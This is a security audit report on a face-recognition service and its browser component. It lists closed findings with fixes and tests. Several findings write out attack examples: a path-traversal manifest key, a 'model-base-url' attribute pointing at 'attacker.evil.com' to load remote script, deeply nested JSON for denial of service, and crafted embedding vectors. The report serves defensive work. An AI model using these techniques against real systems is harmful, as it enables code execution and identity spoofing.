# Security Audit Report

## Executive Summary
This document provides an independent security audit of the `face_inference` repository, covering the Python service/storage/HTTP layers (`src/face_inference/`), the browser runtime (`src/face_inference/web/`), and the client/embeddable web component (`packages/face-capture/`).

The threat model evaluates a public web page embedding `<face-capture>` communicating with a self-hosted `face_inference` server, as well as an attacker who controls the host page, network communication between client and server, foreign browser origins, or direct arbitrary HTTP requests.

### Findings Summary by Severity
- **Critical**: 0
- **High**: 0
- **Medium**: 5
- **Low**: 2
- **Info**: 3
- **Total Findings**: 10

### Summary of Audit Findings
| Severity | Finding ID | Title | Component / Location | Proof Test |
|---|---|---|---|---|
| Medium (closed) | SEC-1 | Arbitrary File Write via Path Traversal in Asset Manifest | `src/face_inference/assets.py:125` | `tests/test_security_audit.py::test_sec_1_manifest_path_traversal` |
| Medium (closed) | SEC-2 | Python Client Forwards Sensitive Authorization Header on HTTP Redirects | `src/face_inference/client.py:221-222` | `tests/test_security_audit.py::test_sec_2_client_redirect_strips_authorization` |
| Medium (closed) | SEC-3 | Remote Script Execution via Unvalidated `model-base-url` Dynamic Import in Web Component | `packages/face-capture/src/face-capture.js:361-363`, `packages/face-capture/src/config.js:24-31` | `tests/test_security_audit.py::test_sec_3_model_base_url_untrusted_origin_rejected` |
| Medium (closed) | SEC-4 | Retention Purge Leaves Biometric Records in SQLite Free Pages and WAL Due to Missing `secure_delete` | `src/face_inference/storage.py:17`, `src/face_inference/service.py:57-64` | `tests/test_security_audit.py::test_sec_4_purge_sqlite_secure_delete_enabled` |
| Medium (closed) | SEC-7 | Session Token Subject Constraint Ignored on Face Recognition Endpoint | `src/face_inference/server.py:249-251` | `tests/test_security_audit.py::test_sec_7_session_token_subject_binding_on_recognition` |
| Low (closed) | SEC-6 | Worker Thread Denial of Service via Deeply Nested JSON Payloads | `src/face_inference/server.py:185`, `src/face_inference/server.py:189-191` | `tests/test_security_audit.py::test_sec_6_deeply_nested_json_dos` |
| Low (closed) | SEC-8 | Absence of In-Browser Cryptographic Hash Verification for ONNX/WASM Model Binaries | `src/face_inference/web/browser-face/worker.mjs:9-10` | `tests/test_security_audit.py::test_sec_8_worker_model_hash_verification` |
| Info | SEC-5 (Refuted) | HTTP/1.0 Connection Semantics & Request-Body Framing Note | `src/face_inference/server.py:171-180`, `src/face_inference/server.py:273-274` | N/A (Refuted via live pipelining socket test) |
| Info | SEC-9 | Client-Side Biometric Embedding Trust (Crafted Templates) | `src/face_inference/service.py:188-190, 224` | N/A (Consistency verified server-side; client embedding trust is architectural) |
| Info | SEC-10 | Plaintext Biometric Embeddings in Calibration and Research Data Exports | `src/face_inference/cli.py:70-73`, `src/face_inference/service.py:249-261` | N/A (Documentation / Operational guidance) |

---

## Findings

### Medium Severity

#### SEC-1 (closed): Arbitrary File Write via Path Traversal in Asset Manifest
- **Status**: Closed. Manifest entries are strictly validated before asset I/O or downloading; any entry with path traversals (`..`), absolute paths, path separators, invalid characters, null bytes, or duplicate entries is rejected. Regression test: `tests/test_manifest_paths.py` and `tests/test_security_audit.py::test_sec_1_manifest_path_traversal`.
- **Location**: `src/face_inference/assets.py:125`
- **Severity Note**: Rated Medium because exploitation requires the operator to point `models fetch` (`--from-dir` or `--base-url`) to an attacker-controlled manifest directory or URL.
- **Attack**: An attacker supplying an untrusted directory (`--from-dir`) or custom asset repository provides a `manifest.json` containing relative path traversal keys (e.g., `{"../escaped.txt": {"sha256": ...}}`). During `fetch()`, the target path is constructed via `target = dest_path / filename` without verifying that the resolved target is contained within `dest_path`.
- **Concrete Impact**: `os.replace(temp_file, target)` writes downloaded or copied files outside `target_dir`, enabling arbitrary local file overwrites (such as application code, configuration files, or user directories) across the host filesystem.
- **Recommended Fix**: Validate all manifest keys before processing. Ensure `filename` is a clean relative path and verify that `(dest_path / filename).resolve().is_relative_to(dest_path.resolve())`. Reject any entry containing parent directory references (`..`), leading slashes, or backslashes.
- **Proof Test**: `tests/test_security_audit.py::test_sec_1_manifest_path_traversal`

#### SEC-2 (closed): Python Client Forwards Sensitive Authorization Header on HTTP Redirects
- **Status**: Closed. The Python client now passes the `Authorization` header via `unredirected_hdrs` in `urllib.request.Request`, ensuring headers are automatically stripped on HTTP redirect hops across origins, and refuses `https` to `http` downgrade redirects. Regression test: `tests/test_client_redirect.py` and `tests/test_security_audit.py::test_sec_2_client_redirect_strips_authorization`.
- **Location**: `src/face_inference/client.py:221-222`
- **Severity Note**: Rated Medium because exploitation requires a redirecting or compromised server/proxy in the request path.
- **Attack**: When `FaceClient._execute_once` sends requests via `urllib.request.urlopen(req)`, it places `Authorization: Bearer <token>` in `headers`, which populates `req.headers`. If an endpoint issues an HTTP 301, 302, 307, or 308 redirect pointing to a third-party domain, Python's default `HTTPRedirectHandler` preserves all non-content headers across origins.
- **Concrete Impact**: The sensitive master API token or scoped session token is leaked in plaintext in the `Authorization` header to external, untrusted third-party hosts.
- **Recommended Fix**: Pass the `Authorization` header via `unredirected_hdrs` in `urllib.request.Request(..., unredirected_hdrs={'Authorization': ...})`, or provide a custom `HTTPRedirectHandler` that strips `Authorization` headers whenever a redirect changes origin (scheme, host, or port).
- **Proof Test**: `tests/test_security_audit.py::test_sec_2_client_redirect_strips_authorization`

#### SEC-3 (closed): Remote Script Execution via Unvalidated `model-base-url` Dynamic Import in Web Component
- **Status**: Closed in two steps. (1) The component always uses its shipped capture code. (2) A later review found ONNX Runtime still imported its own JavaScript glue from the `model-base-url` prefix, so an asset origin could run code; the worker now selects the shipped glue explicitly and verifies the WASM bytes (see SEC-8). Verified in real Chrome against a hostile origin: before the second fix the booby-trapped glue was requested and executed, after it the glue is never requested. `model-base-url` only supplies model/WASM asset bytes (project decision: assets may come from a CDN, code may not). Regression test: `tests/test_security_audit.py::test_sec_3_component_never_imports_code_from_model_base_url` and `packages/face-capture/test/import-trust.test.mjs`.
- **Location**: `packages/face-capture/src/face-capture.js:361-363`, `packages/face-capture/src/config.js:24-31`
- **Severity Note**: Rated Medium because exploitation requires an attacker to control or influence DOM attributes on the hosting web page (`<face-capture model-base-url="...">`).
- **Attack**: An attacker who can influence DOM attributes sets `<face-capture model-base-url="https://attacker.evil.com/models/">`. When `start()` executes, `_resolveCaptureClass` resolves `new URL('browser-face/capture.mjs', modelBaseUrl).href` and directly invokes dynamic `import(/* @vite-ignore */ url)`.
- **Concrete Impact**: Arbitrary JavaScript code execution inside the origin of the hosting web page without origin restriction, domain allowlisting, or Subresource Integrity (SRI) validation.
- **Recommended Fix**: Enforce strict origin validation in `validateConfig` to ensure `modelBaseUrl` is restricted to same-origin or an explicit trusted domain allowlist. Avoid dynamic runtime `import()` of unpinned remote scripts.
- **Proof Test**: `tests/test_security_audit.py::test_sec_3_model_base_url_untrusted_origin_rejected`

#### SEC-4 (closed): Retention Purge Leaves Biometric Records in SQLite Free Pages and WAL Due to Missing `secure_delete`
- **Status**: Closed. Every database connection enables `PRAGMA secure_delete = ON` to zero deleted content in SQLite database pages, and purge/deletion service methods execute `PRAGMA wal_checkpoint(TRUNCATE)` after transaction commit to scrub old WAL frames. **Honest residual**: Physical SSD wear-leveling, unmanaged backups, replicas, and snapshots are not covered; raw-file deletion checks do not guarantee forensic erasure from physical flash storage hardware, and WAL truncation is best-effort under concurrent read load (`docs/deletion.md`). Regression test: `tests/test_deletion_storage.py` and `tests/test_security_audit.py::test_sec_4_purge_sqlite_secure_delete_enabled`.
- **Location**: `src/face_inference/storage.py:17`, `src/face_inference/service.py:57-64`
- **Severity Note**: Rated Medium because exploitation requires forensic access to the database file or backup media.
- **Attack**: When retention expires or a subject deletion is requested, `service.purge()` runs `DELETE FROM captures WHERE expires_at<=?` and nulls templates in `people`. Because `SQLiteRepository` connects with default settings (`PRAGMA secure_delete=0`), deleted rows and nullified BLOBs are not zeroed on disk; they remain in SQLite unallocated free pages and WAL frames.
- **Concrete Impact**: Anyone with access to the database file or backup storage can forensically recover deleted biometric templates and capture metadata, circumventing data retention and deletion policies.
- **Recommended Fix**: Configure `PRAGMA secure_delete = ON` (or `FAST`) in `SQLiteRepository.connect()`, and execute `VACUUM` or WAL checkpoints following purge operations.
- **Proof Test**: `tests/test_security_audit.py::test_sec_4_purge_sqlite_secure_delete_enabled`

#### SEC-7 (closed): Session Token Subject Constraint Ignored on Face Recognition Endpoint
- **Status**: Closed. The recognition endpoint (`POST /api/v1/collections/{id}/recognitions`) strictly enforces that when a session token contains a subject claim (`claims.subject`), `body.get('eligible_ids')` must equal `[claims.subject]`, returning HTTP 403 otherwise. Regression test: `tests/test_recognition_scope.py` and `tests/test_security_audit.py::test_sec_7_session_token_subject_binding_on_recognition`.
- **Location**: `src/face_inference/server.py:249-251`
- **Severity Note**: Rated Medium because a session token restricted to a specific subject (e.g., alice) allows querying recognitions against any other subject (e.g., bob).
- **Attack**: An administrator issues a session token restricted to a specific subject (`scope="recognize"`, `person_id="alice"`). A client using this token sends a recognition request to `POST /api/v1/collections/{id}/recognitions` specifying `eligible_ids: ["bob"]`. Line 249 of `server.py` validates `claims.subject` only when `resource == 'enrollments'`.
- **Concrete Impact**: A session token minted strictly to recognize or verify a single individual can be used to query and recognize arbitrary persons in the collection.
- **Recommended Fix**: Enforce that when `claims.subject` is present on a recognition token, `body.get('eligible_ids')` must strictly equal `[claims.subject]`, returning HTTP 403 otherwise.
- **Proof Test**: `tests/test_security_audit.py::test_sec_7_session_token_subject_binding_on_recognition`

---

### Low Severity

#### SEC-6 (closed): Worker Thread Denial of Service via Deeply Nested JSON Payloads
- **Status**: Closed. `read_json()` catches `RecursionError` alongside `(ValueError, UnicodeError)` and converts it to `FaceError('INVALID_JSON', 'A valid finite JSON object is required', 400)`, preventing recursion crashes from killing worker thread processing. Regression test: `tests/test_json_depth.py` and `tests/test_security_audit.py::test_sec_6_deeply_nested_json_dos`.
- **Location**: `src/face_inference/server.py:185`, `src/face_inference/server.py:189-191`
- **Severity Note**: Rated Low because the unhandled exception is confined to the individual worker thread handling the request; live verification confirms the server daemon stays up and subsequent requests (e.g., `/health`) continue to succeed with HTTP 200.
- **Attack**: An attacker submits a POST request containing a 100 KiB body with 15,000 nested JSON object brackets (`{"a":{"a":...}}`). In Python 3.12, `json.loads` exceeds the maximum recursion depth and raises `RecursionError`.
- **Concrete Impact**: Because `read_json()` only catches `(ValueError, UnicodeError)`, `RecursionError` escapes to `dispatch()`, triggering a 500 internal server error for that specific request. While worker threads in `ThreadingHTTPServer` recover after the exception, deep nesting can exhaust worker thread stacks during deserialization.
- **Recommended Fix**: Explicitly catch `RecursionError` in `read_json()` and translate it to `FaceError('INVALID_JSON', 'Payload exceeds maximum nesting depth', 400)`, or enforce a maximum parsing depth check before deserialization.
- **Proof Test**: `tests/test_security_audit.py::test_sec_6_deeply_nested_json_dos`

#### SEC-8 (closed): Absence of In-Browser Cryptographic Hash Verification for ONNX/WASM Model Binaries
- **Status**: Closed for the YuNet and SFace model files. The worker fetches each model, verifies its SHA-256 against pins shipped in `model-pins.mjs` (checked against `manifest.json` at build time), and passes the verified bytes to ONNX Runtime; any failure is fatal (`docs/asset-trust.md`). The ONNX Runtime `.wasm` binary is verified the same way, and ONNX Runtime's JavaScript glue is loaded only from the shipped package, never from the asset origin. Remaining limit: compromised shipped JavaScript or package contents are out of scope. Regression test: `tests/test_security_audit.py::test_sec_8_worker_verifies_model_bytes_before_creating_sessions`.
- **Location**: `src/face_inference/web/browser-face/worker.mjs:9-10`
- **Severity Note**: Rated Low because exploitation requires CDN infrastructure compromise or unauthenticated network modification.
- **Attack**: The model contract specifies `detector_source_sha256` and `recognizer_source_sha256`. However, in `worker.mjs`, `ort.InferenceSession.create(assets + config.detector_file)` passes the URL directly to the ONNX runtime without computing or checking the file's SHA-256 digest in the browser.
- **Concrete Impact**: If assets are hosted on an external CDN or compromised web server, modified model binaries could be loaded and executed by the browser without detection.
- **Recommended Fix**: Download model files as `ArrayBuffer` in the browser, compute `crypto.subtle.digest('SHA-256', buffer)`, verify against `config.detector_source_sha256` and `config.recognizer_source_sha256`, and supply the validated buffer to `ort.InferenceSession.create(buffer)`.
- **Proof Test**: `tests/test_security_audit.py::test_sec_8_worker_model_hash_verification`

---

### Informational / Architectural Observations

#### SEC-5 (Refuted): HTTP/1.0 Connection Semantics & Request-Body Framing Note
- **Location**: `src/face_inference/server.py:171-180`, `src/face_inference/server.py:273-274`
- **Refutation Findings**: Finding SEC-5 hypothesized that unconsumed request body bytes on framing errors (such as chunked encoding or invalid JSON) could cause HTTP request smuggling or pipelining desynchronization on persistent connections. This finding is refuted: `src/face_inference/server.py` never configures `protocol_version`, so `BaseHTTPRequestHandler` operates strictly under HTTP/1.0 semantics (`protocol_version = 'HTTP/1.0'`) and closes the connection after every response (`close_connection = 1`).
- **Socket Verification**: Verified via an end-to-end TCP socket test: sending two pipelined HTTP requests (a chunked-body POST followed immediately by a `GET /health` on the same connection) confirmed that the server replies with `HTTP/1.0 400 Bad Request` and immediately terminates the TCP connection (`recv()` returns EOF). The pipelined `GET /health` is never read or served.
- **Architecture Note**: Keep-alive is not enabled; if HTTP/1.1 keep-alive is ever enabled in the future, request-body errors must explicitly set `close_connection = True`.

#### SEC-9: Client-Side Biometric Embedding Trust (Crafted Templates)
- **Location**: `src/face_inference/service.py:188-190`, `src/face_inference/service.py:224`
- **Observation & Verification**: Round 1 originally hypothesized that `POST /enrollments` does not verify `template == aggregate(observations)`. Investigation of `src/face_inference/service.py:188-190` confirms that the server derives `template = aggregate(values)` from submitted observations, verifies `if cosine(template, vector(payload.get('template'))) < 1 - 1e-6: raise FaceError('AGGREGATE_MISMATCH', 'Submitted template does not match the observations')`, and rejects mismatched templates with HTTP 400. Furthermore, line 224 saves the server-derived `self.repository.encrypt(template)`. Live HTTP verification confirms that an enrollment request with observations A and an unrelated template is rejected with HTTP 400.
- **Threat Model Consideration**: In this client-side inference architecture, facial detection and recognition inference run inside the browser WASM engine; the server never receives raw camera frames, only 128-dimensional embedding vectors. An attacker possessing an enroll-scope session token can construct arbitrary synthetic unit vectors (e.g. an artificial centroid that matches multiple identities) and submit them as identical observations (`[V]*5`) alongside `template: V`. Because `aggregate([V]*5) == V`, the server accepts and stores `V`. Eliminating this risk requires server-side image inference or hardware attestation, which is outside the threat model (per BRIEF.md decision 6: "liveness NOT provided").
- **Recommended Fix**: Document the client-side embedding trust boundary and consider requiring server-side variance checks on observations (rejecting identical synthetic vectors) in future major versions.

#### SEC-10: Plaintext Biometric Embeddings in Calibration and Research Data Exports
- **Location**: `src/face_inference/cli.py:70-73`, `src/face_inference/service.py:249-261`
- **Observation**: The `face-inference export` CLI command writes decrypted observation vectors and aggregate embeddings into plaintext JSONL files. While the file mode is constrained to `0o600`, administrators should be cautioned that export files contain unencrypted biometric embeddings.
- **Recommended Fix**: Add documentation notices and recommend immediate ingestion or secondary encryption for exported calibration files.

---

## Verified Sound Architectural Controls (Verified OK)

During the audit, the following critical security mechanisms were examined and confirmed to be implemented robustly:

1. **Constant-Time Authentication Comparison**:
   - `src/face_inference/server.py:144`: API token validation strictly uses `hmac.compare_digest(authorization.encode(), expected.encode())`, preventing timing side-channel attacks against the master credential.

2. **CORS and Origin Validation**:
   - `src/face_inference/server.py:115-116, 159-167`: Cross-origin requests are matched against an explicit string allowlist (`allowed_origins`). Local loopback origins are validated for exact host and server port match. `null` origins and wildcard subdomain spoofing are rejected.

3. **Path Traversal and Symlink Protections**:
   - `src/face_inference/server.py:193-195, 259-260`: Server asset paths reject `..`, `\`, and null bytes `\x00`. Asset lookup uses an explicit dictionary map of registered files, and `file.is_symlink()` is verified to prevent symlink traversal.

4. **Token Verification Order**:
   - `src/face_inference/tokens.py:89-92`: HMAC cryptographic signatures are verified across the raw encoded message payload before any untrusted JSON claims are parsed or decoded.

5. **Request Size Bounds**:
   - `src/face_inference/server.py:179-180`: Body size is bounded to `MAX_BODY = 128 * 1024` (128 KiB) prior to reading from the network socket stream, protecting against buffer exhaustion.

6. **SQL Query Parameterization**:
   - `src/face_inference/service.py`, `src/face_inference/storage.py`: All database statements uniformly employ parameterized `?` placeholders with SQLite bindings; dynamic SQL string interpolation is absent.

7. **Cryptographic Encryption at Rest**:
   - `src/face_inference/storage.py:15, 56-63`: Biometric templates and capture observations are encrypted using Fernet (AES-128-CBC with HMAC-SHA256 authenticated encryption). Database key verification is confirmed on initialization using `encryption_check`.

8. **Atomic File Operations**:
   - `src/face_inference/config.py:67-72`, `src/face_inference/assets.py:207-212`: Configuration updates and model downloads write to isolated temporary files with restrictive permissions (`0o600`) before atomic replacement via `os.replace`.

9. **Redirect Protocol Validation in Asset Fetching**:
   - `src/face_inference/assets.py:172-181`: Redirect responses during model downloading inspect `resp.geturl()` and explicitly refuse any redirect to insecure non-HTTPS protocols.
